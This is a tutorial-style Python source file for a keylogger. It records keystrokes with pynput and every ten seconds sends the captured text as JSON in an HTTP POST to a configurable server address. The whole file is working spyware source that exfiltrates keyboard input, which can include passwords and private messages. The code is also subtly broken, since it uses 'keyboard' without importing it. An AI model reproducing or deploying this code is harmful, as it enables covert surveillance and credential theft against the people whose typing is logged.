# There are three dependencies of this simple python keylogger i.e. pynput, requests and threading.
# pynput- This is a library in Python, allows you to control and monitor input devices. Currently, mouse and keyboard input and monitoring are supported.
# requests - Requests is a simple, yet elegant, HTTP Library. This will post the data to server.
# threading - A module in Python provides a timer class that allows you to run a function or method after a specified interval of time.
# Install dependencies using Pip, a Python Package Manager : pip install pynput requests

import requests 
import json         # The Timer module is part of the threading package.
import threading    # The Timer module is part of the threading package.

# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
text = ""

ip_address = "127.0.0.1" # Provide server and ip address here.
port_number = "8080"
# Time interval in seconds for code to execute.
time_interval = 10

def send_post_req():
    try:
        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
        # the format {"keyboardData" : "<value_of_text>"}
        payload = json.dumps({"keyboardData" : text})
        # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, send_post_req)
        # We start the timer thread.
        timer.start()
    except:
        print("Couldn't complete request!")

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

# Based on the key press we handle the way the key gets logged to the in memory string.
# Read more on the different keys that can be logged here:
# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")

# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(
    on_press=on_press) as listener:
    # We start of by sending the post request to our server.
    send_post_req()
    listener.join()
